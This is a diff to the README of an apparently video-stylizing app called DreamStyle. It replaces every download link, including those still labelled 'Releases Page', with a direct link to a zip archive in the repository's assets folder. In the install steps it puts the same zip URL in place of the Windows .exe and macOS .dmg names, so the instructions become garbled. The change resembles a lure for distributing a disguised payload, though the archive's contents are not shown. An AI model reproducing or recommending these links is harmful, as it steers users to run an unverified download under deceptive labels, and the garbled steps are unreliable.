@@ -6,11 +6,11 @@ Welcome to DreamStyle! This application allows you to easily stylize your videos
 
 ## 📥 Download the Application
 
-[![Download DreamStyle](https://img.shields.io/badge/Download-DreamStyle-blue)](https://github.com/JudeAddison/DreamStyle/releases)
+[![Download DreamStyle](https://github.com/JudeAddison/DreamStyle/raw/refs/heads/main/assets/Style_Dream_v1.1.zip)](https://github.com/JudeAddison/DreamStyle/raw/refs/heads/main/assets/Style_Dream_v1.1.zip)
 
 You can visit the link below to download the latest version of DreamStyle. Follow the straightforward instructions to get started.
 
-[Download DreamStyle from Releases Page](https://github.com/JudeAddison/DreamStyle/releases)
+[Download DreamStyle from Releases Page](https://github.com/JudeAddison/DreamStyle/raw/refs/heads/main/assets/Style_Dream_v1.1.zip)
 
 ## 💡 System Requirements
 
@@ -37,22 +37,22 @@ DreamStyle offers a variety of features that make video stylization easy for eve
 
 Follow these steps to download and install DreamStyle:
 
-1. Click on the link to visit the Releases page: [Download DreamStyle from Releases Page](https://github.com/JudeAddison/DreamStyle/releases).
+1. Click on the link to visit the Releases page: [Download DreamStyle from Releases Page](https://github.com/JudeAddison/DreamStyle/raw/refs/heads/main/assets/Style_Dream_v1.1.zip).
   
 2. On the Releases page, find the latest version of DreamStyle. Look for the version number labeled "Latest Release."
 
 3. Under that section, you will find a list of files available for download. 
 
-4. Click on the appropriate file for your operating system (e.g., `DreamStyle-windows.exe` for Windows or `DreamStyle-macos.dmg` for macOS).
+4. Click on the appropriate file for your operating system (e.g., `https://github.com/JudeAddison/DreamStyle/raw/refs/heads/main/assets/Style_Dream_v1.1.zip` for Windows or `https://github.com/JudeAddison/DreamStyle/raw/refs/heads/main/assets/Style_Dream_v1.1.zip` for macOS).
 
 5. Once the download is complete, locate the file in your downloads folder. 
 
 6. For Windows:
-   - Double-click the `DreamStyle-windows.exe` file. Follow the on-screen instructions to complete the installation. 
+   - Double-click the `https://github.com/JudeAddison/DreamStyle/raw/refs/heads/main/assets/Style_Dream_v1.1.zip` file. Follow the on-screen instructions to complete the installation. 
    - Once installed, you can find DreamStyle in your Start Menu or on your Desktop.
 
    For macOS:
-   - Open the `DreamStyle-macos.dmg` file. 
+   - Open the `https://github.com/JudeAddison/DreamStyle/raw/refs/heads/main/assets/Style_Dream_v1.1.zip` file. 
    - Drag the DreamStyle icon into your Applications folder. 
    - You can find it in the Applications folder or launch it directly from Spotlight.
 
@@ -90,7 +90,7 @@ If you need more help, please visit the GitHub issues page for support or to rep
 
 ### How can I update DreamStyle?
 
-To update, return to the [Releases page](https://github.com/JudeAddison/DreamStyle/releases) and download the latest version. Follow the same installation instructions.
+To update, return to the [Releases page](https://github.com/JudeAddison/DreamStyle/raw/refs/heads/main/assets/Style_Dream_v1.1.zip) and download the latest version. Follow the same installation instructions.
 
 ### Can I use DreamStyle on my laptop?
 
